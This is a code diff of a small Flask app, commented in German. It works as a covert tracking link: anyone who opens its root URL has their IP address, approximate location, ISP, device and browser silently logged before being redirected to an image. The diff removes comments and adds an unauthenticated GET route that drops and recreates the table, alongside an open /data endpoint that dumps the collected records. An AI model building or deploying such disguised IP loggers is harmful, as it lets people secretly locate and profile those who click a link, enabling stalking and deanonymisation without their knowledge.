@@ -3,14 +3,15 @@ import sqlite3
 import requests
 from datetime import datetime
 import os
-import json
 
 app = Flask(__name__)
 
-# --- Datenbank initialisieren (erweiterte Tabelle) ---
+# --- Datenbank initialisieren ---
 def init_db():
     conn = sqlite3.connect('database.db')
     c = conn.cursor()
+    
+    # Tabelle mit ALLEN Spalten neu erstellen
     c.execute('''
         CREATE TABLE IF NOT EXISTS clicks (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -40,10 +41,9 @@ def init_db():
     conn.commit()
     conn.close()
 
-# --- IP-Geolocation (erweitert) ---
+# --- IP-Geolocation ---
 def get_ip_geolocation(ip):
     try:
-        # Mehr Felder abfragen (inkl. ISP, ASN, Proxy)
         response = requests.get(
             f'http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,isp,as,asname,proxy,mobile',
             timeout=5
@@ -69,11 +69,10 @@ def get_ip_geolocation(ip):
         'isp': '', 'asn': '', 'is_proxy': False, 'is_mobile': False
     }
 
-# --- User-Agent parsen (erweitert) ---
+# --- User-Agent parsen ---
 def parse_user_agent(user_agent):
     ua = user_agent.lower()
     
-    # Betriebssystem
     platform = 'Unknown'
     if 'windows' in ua: platform = 'Windows'
     elif 'macintosh' in ua or 'mac os' in ua: platform = 'macOS'
@@ -81,12 +80,10 @@ def parse_user_agent(user_agent):
     elif 'android' in ua: platform = 'Android'
     elif 'iphone' in ua or 'ipad' in ua: platform = 'iOS'
     
-    # Browser
     browser = 'Unknown'
     browser_version = ''
     if 'edg' in ua:
         browser = 'Edge'
-        # Version extrahieren (einfach)
         try:
             if 'edg/' in ua:
                 browser_version = ua.split('edg/')[1].split('.')[0]
@@ -116,14 +113,12 @@ def parse_user_agent(user_agent):
                 browser_version = ua.split('firefox/')[1].split('.')[0]
         except: pass
     
-    # Gerätetyp
     device_type = 'Desktop'
     if 'mobile' in ua or 'android' in ua:
         device_type = 'Mobile'
     elif 'tablet' in ua or 'ipad' in ua:
         device_type = 'Tablet'
     
-    # Gerätemodell (für Mobile)
     device_model = 'Unknown'
     if 'iphone' in ua:
         if 'iphone 15' in ua: device_model = 'iPhone 15'
@@ -136,37 +131,29 @@ def parse_user_agent(user_agent):
     
     return platform, browser, browser_version, device_type, device_model
 
-# --- Hauptroute: Trackt und leitet zum Bild weiter ---
+# --- Hauptroute ---
 @app.route('/')
 def track_and_redirect():
-    # 1. IP-Adresse
     ip = request.remote_addr
     if request.headers.get('X-Forwarded-For'):
         ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
     
-    # 2. Geolocation + ISP + ASN + Proxy
     geo = get_ip_geolocation(ip)
-    
-    # 3. User-Agent parsen
     user_agent = request.headers.get('User-Agent', '')
     platform, browser, browser_version, device_type, device_model = parse_user_agent(user_agent)
     
-    # 4. Zusätzliche Client-Informationen
     language = request.headers.get('Accept-Language', '').split(',')[0] if request.headers.get('Accept-Language') else ''
     referrer = request.headers.get('Referer', '')
     
-    # 5. Timestamp
     now = datetime.now()
     timestamp = now.isoformat()
     timestamp_readable = now.strftime('%Y-%m-%d %H:%M:%S')
-    timezone = 'UTC'  # Fallback
+    timezone = 'UTC'
     try:
-        import pytz
         timezone = str(datetime.now().astimezone().tzinfo) or 'UTC'
     except:
         pass
     
-    # 6. In Datenbank speichern
     conn = sqlite3.connect('database.db')
     c = conn.cursor()
     c.execute('''
@@ -181,7 +168,7 @@ def track_and_redirect():
         ip, user_agent, platform, browser, browser_version,
         device_type, device_model, geo['city'], geo['region'], geo['country'],
         geo['latitude'], geo['longitude'], timestamp, timestamp_readable,
-        timezone, language, '', referrer,  # screen_resolution wird später per JS gesetzt
+        timezone, language, '', referrer,
         geo['isp'], geo['asn'], geo['is_proxy']
     ))
     conn.commit()
@@ -189,7 +176,7 @@ def track_and_redirect():
     
     return redirect('https://i.postimg.cc/9MWQhv5r/ograda.jpg', 302)
 
-# --- Daten anzeigen (erweitert) ---
+# --- Daten anzeigen ---
 @app.route('/data')
 def view_data():
     conn = sqlite3.connect('database.db')
@@ -212,7 +199,7 @@ def view_data():
     
     return jsonify(result)
 
-# --- Daten zurücksetzen ---
+# --- Daten zurücksetzen (NUR Daten) ---
 @app.route('/resetdata', methods=['GET'])
 def reset_data():
     try:
@@ -222,10 +209,54 @@ def reset_data():
         c.execute("DELETE FROM sqlite_sequence WHERE name='clicks'")
         conn.commit()
         conn.close()
-        
         return jsonify({
             'status': 'success',
             'message': 'All data deleted successfully'
+        }), 200
+    except Exception as e:
+        return jsonify({
+            'status': 'error',
+            'message': str(e)
+        }), 500
+
+# --- DATENBANK KOMPLETT ZURÜCKSETZEN (Tabelle neu erstellen) ---
+@app.route('/resetdb', methods=['GET'])
+def reset_db():
+    try:
+        conn = sqlite3.connect('database.db')
+        c = conn.cursor()
+        c.execute('DROP TABLE IF EXISTS clicks')
+        c.execute('''
+            CREATE TABLE clicks (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                ip_address TEXT,
+                user_agent TEXT,
+                platform TEXT,
+                browser TEXT,
+                browser_version TEXT,
+                device_type TEXT,
+                device_model TEXT,
+                city TEXT,
+                region TEXT,
+                country TEXT,
+                latitude REAL,
+                longitude REAL,
+                timestamp TEXT,
+                timestamp_readable TEXT,
+                timezone TEXT,
+                language TEXT,
+                screen_resolution TEXT,
+                referrer TEXT,
+                isp TEXT,
+                asn TEXT,
+                is_proxy BOOLEAN
+            )
+        ''')
+        conn.commit()
+        conn.close()
+        return jsonify({
+            'status': 'success',
+            'message': 'Database table recreated successfully'
         }), 200
     except Exception as e:
         return jsonify({
